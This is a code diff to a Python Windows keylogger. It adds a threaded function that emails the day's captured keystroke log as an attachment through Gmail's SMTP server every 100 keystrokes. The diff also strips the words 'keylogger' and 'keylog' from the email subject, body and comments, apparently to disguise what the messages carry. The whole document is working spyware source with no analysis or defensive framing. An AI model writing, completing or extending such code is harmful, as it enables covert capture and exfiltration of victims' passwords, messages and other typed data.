@@ -19,8 +19,9 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
+import threading
 
-
+from threading import Thread
 
 
 
@@ -54,12 +55,13 @@ def converttotable():
   locationofFileandNameForLogs = os.path.join(pathforlogs, datelogname + "-logfile.txt")
   locationofFileandNameForLogsTable = os.path.join(pathforlogs, datelogname + "-logfile.csv")
 
-  try:
+  try:   # If file does not exist, then skip the function and keep going(text file will be created in the onkeyboard function).
     f = open(locationofFileandNameForLogs, 'r')
 
   except FileNotFoundError:
     print("the file was not found. But keep going, it will be converted after  the text file created")
     return
+
 
   try:
     os.chmod(locationofFileandNameForLogsTable, S_IWUSR | S_IREAD)  # this will set the table file to read and write.
@@ -102,31 +104,43 @@ def givenewline():
 
 
 # The main function of the program. It runs whenever a key is pressed.
+def sendfiles():
 
-  def sendfiles():
     datelogname = datetime.today().strftime('%m-%d-%Y')
+    datelognamestring = str(datelogname)
 
-    emailuser = "email"
-    emailpassword = 'email'
-    emailsend = 'email'
+    emailuser = ""
+    emailpassword = ""
+    emailsend = ''
 
-    subject = 'Keylogger file for '
+    subject = ' file' + datelogname
 
     msg = MIMEMultipart()
     msg['From'] = emailuser
     msg['To'] = emailsend
     msg['subject'] = subject
 
-    body = "Hi there, Here is the keylog file for "
+    body = "Hi there, Here is the log file "
     msg.attach(MIMEText(body, 'plain'))
+    locationofFileandNameForLogsTable = os.path.join(pathforlogs, datelogname + "-logfile.csv")
 
-    text = msg.as_string()  # chages the message to a string
+    filename =  locationofFileandNameForLogsTable
+    attachment = open(filename, 'r')
+    part = MIMEBase('application','octet-stream')
+    part.set_payload((attachment).read())
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition',"attachment; filename= " +filename)
+
+
+    msg.attach(part)
+    text = msg.as_string()  # changes the message to a string
+
 
     server = smtplib.SMTP('smtp.gmail.com', 587)  # define the sever to connnect to
     server.starttls()
     server.login(emailuser, emailpassword)  # the username and password to use
 
-    server.sendmail(emailuser, emailsend, text)  # the message it will be coming from and the message it will be sent to
+    server.sendmail(emailuser, emailsend, text)
     server.quit()
 
 
@@ -213,14 +227,26 @@ def OnKeyboardEvent(event):
 
 
   logfile.write(buffers)  # writes the key pressed  to the file
-  global  keystrokecount  # counter for the number of keystrokes pressed
+  global   keystrokecount  # counter for the number of
 
-  keystrokecount += 1 # adds one to the counter each time a key is pressed
+  keystrokecount += 1 # adds one to the counter each time a
 
-  print("Keystroke count is now ", keystrokecount) # prints out the keystroke cuurent count.
+  if  keystrokecount == 100:
+    print(" count is equal to 100")
+    print("Time to send off the log table to the email")
+
+    keystrokecount = 0
+    #sendfiles()
+    thread = Thread(target=sendfiles)
+    thread.start()
+
+
+
+  print(" count is now ",  keystrokecount) # prints out the  count.
 
   logfile.close()  # closes the file
   converttotable()
+
   return True
 
 
@@ -236,7 +262,7 @@ def main():
   pythoncom.PumpMessages()
 
   givenewline()
-
+  converttotable()
 
 
 if __name__ == "__main__":
